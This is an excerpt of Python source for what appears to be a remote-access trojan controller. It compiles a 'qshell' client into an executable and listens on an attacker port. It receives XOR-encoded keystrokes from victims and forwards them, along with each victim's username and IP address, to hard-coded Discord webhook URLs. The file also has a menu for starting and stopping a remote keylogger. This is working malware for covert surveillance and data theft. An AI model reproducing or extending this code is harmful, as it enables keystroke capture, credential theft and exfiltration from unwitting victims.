...
ATTACKER_PORT = 9999
SECRET_KEY = b"edgar"
WEBHOOK_INFO = "https://discord.com/api/webhooks/1390719613133914112/sIp1S8Z_Yp_bx5L1QtfnyWWdUyi4qJAatGUV2RrIXMO9Ds-kYuUJLOZoziMZUXB_3O88"
WEBHOOK_LOGS = "https://discord.com/api/webhooks/1390684705514324059/4qsnyLS2v3OLvjXclxgJ3MeW9OC4u_-fA6xCyrh2283cbSA2LwL2q4aiWcDit2R34nBL"
...
\033[36m║ \033[33mkeylogger\033[36m                - Control keylogger (start/stop)      ║
...
def build_executable():
    try:
        ...
        qshell_path = os.path.join(script_dir, "qshell.py")
        
        if not os.path.exists(qshell_path):
            print(f"[!] qshell.py not found at: {qshell_path}")
            return None
        ...
        with open(qshell_path, 'r', encoding='utf-8') as f:
            content = f.read()
        ...
        temp_qshell = os.path.join(script_dir, "qshell_temp.py")
        with open(temp_qshell, 'w', encoding='utf-8') as f:
            f.write(content)
        
        if not os.path.exists(temp_qshell):
            print(f"[!] Failed to create temporary file: {temp_qshell}")
            return None
            ...
            if result.returncode == 0 and os.path.exists(exe_path):
                ...
                try:
                    ...
                    if os.path.exists(spec_file):
                        os.remove(spec_file)
                    if os.path.exists(temp_qshell):
                        os.remove(temp_qshell)
                except Exception as e:
...
try:
    ...
    keylog_receiving = True
    print(f"[+] Connected with {username} ({addr[0]})\n")
    send_to_discord(WEBHOOK_INFO, f"🟢 User **{username}** connected with IP `{addr[0]}`")
    
    show_welcome_menu()
    
    def receive_keylogs_async():
        global client, username, keylog_receiving
        while keylog_receiving and client:
            try:
                ...
                try:
                    ...
                    if data:
                        try:
                            decoded = xor_base64_decode(data)
                            if decoded and decoded.strip() and not decoded.startswith("Command executed"):
                                print(f"\033[35m[KEYLOG] {decoded}\033[0m")
                                send_to_discord(WEBHOOK_LOGS, f"**{username}**: {decoded}")
                        except Exception:
                            pass
                except socket.timeout:
                    continue
    ...
    keylog_thread = threading.Thread(target=receive_keylogs_async, daemon=True)
    keylog_thread.start()
...
while True:
    try:
        ...
        if cmd.lower() == "help":
            ...
            print("\033[33m[?] Keylogger control:")
            print("\033[33m    1. Start keylogger")
            print("\033[33m    2. Stop keylogger")
            choice = input("\033[33m    Choose (1/2): ")
            if choice == "1":
                try:
                    client.send('run_keylogger'.encode())
                    print("\033[32m[+] Keylogger started")
                except Exception:
                    print("\033[31m[!] Failed to start keylogger")
            elif choice == "2":
                try:
                    client.send('stop_keylogger'.encode())
                    print("\033[32m[+] Keylogger stopped")
                except Exception:
                    print("\033[31m[!] Failed to stop keylogger")
            continue
